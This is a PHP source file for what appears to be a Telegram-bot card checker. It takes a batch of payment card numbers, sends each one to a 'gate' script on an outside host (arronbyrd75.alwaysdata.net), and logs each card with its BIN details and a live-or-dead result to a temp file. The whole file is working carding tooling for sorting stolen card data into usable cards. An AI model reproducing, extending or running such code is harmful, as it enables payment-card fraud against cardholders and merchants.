<?php 
use App\Models\Bot;
use App\Gate\{Bin, Card, CurlX};
if (!isset($gate)) die('Direct access not permitted');

ini_set('display_errors', 1);
$content = file_get_contents("php://input");
$update = json_decode($content, true);
$dirInit = dirname(__FILE__);
require $dirInit.'/functions.php';
$r_file = glob('mass/'.$gate['link'].'/*.php');
// Decode info
$user = $update['user'];
$card    = $update['ccs'];
$cmd     = $update['gate'];
Bot::SendMsg($user['chat_id'], print_r($user, true));
$total = count($card);


$cards = '';
for ($i=0; $i < $total; $i++) { 
	$cards .= '<code>'.implode('|', $card[$i]['cc']).'</code>'.PHP_EOL;
}

Bot::EditMsgTxt($user['chat_id'], $user['ida'], '<b><i>Checking cards</i></b>'.PHP_EOL.$cards);

for ($i=0; $i < $total; $i++) { 
	$file_r = $r_file[array_rand($r_file)];
    $data = array(
        'user' => $user,
        'gate' => $cmd,
        'card' => $card[$i]['cc']
    );
    $data = json_encode($data);
    Bot::SendMsg($user['chat_id'], print_r(json_decode($data, true), true));
    $a = CurlX::Post('https://arronbyrd75.alwaysdata.net/kirari/public/gates/'.$file_r, $data);
    $res = json_decode($a->body, true);
    
    $string = implode('|', $card[$i]['cc']).'||'.$card[$i]['bin']['flag'].'-'.$card[$i]['bin']['type'].'-'.$card[$i]['bin']['level'].'||'.$res['res']['content'].' '.$res['res']['emoji'].'||'.$cmd['name'].'\n';
    $file_name = '../files/temp/'.$user['tmp_file'];
    arquivo($file_name, $string, 'a+');
    if (!file_exists($file_name)) {
        die(' No such file or directory');
      }
      
    $cards = file($file_name, FILE_SKIP_EMPTY_LINES | FILE_IGNORE_NEW_LINES);
    $total_cards = count($cards);
      
}

# Abrir archivos, y guardar contenido en el 
function arquivo($path, $content, $mode = 'w+') {
    $handle = fopen($path, $mode);
    fwrite($handle, $content);
    fclose($handle);
};
